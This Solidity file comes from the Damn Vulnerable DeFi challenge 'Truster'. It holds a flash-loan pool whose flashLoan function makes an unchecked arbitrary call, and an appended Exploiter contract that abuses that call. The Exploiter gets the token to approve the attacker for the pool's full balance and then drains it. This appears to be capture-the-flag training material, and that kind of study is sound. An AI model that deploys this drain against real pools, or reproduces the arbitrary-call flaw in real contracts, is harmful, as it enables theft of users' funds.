// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterLenderPool is ReentrancyGuard {

    using Address for address;

    IERC20 public immutable damnValuableToken;

    constructor (address tokenAddress) {
        damnValuableToken = IERC20(tokenAddress);
    }

    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
    {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
        damnValuableToken.transfer(borrower, borrowAmount);
        target.functionCall(data);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }

}

contract Exploiter{
    address pool;
    address token;
    constructor(address _pool, address _token){
        pool = _pool;
        token = _token;
    }
    function exploit() public{
        IERC20 tokenContract = IERC20(token);
        uint256 poolBalance = tokenContract.balanceOf(pool);
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",address(this),
            poolBalance
        );
        TrusterLenderPool(pool).flashLoan(0, msg.sender, token, data);
        tokenContract.transferFrom(pool, msg.sender, poolBalance);
    }
}

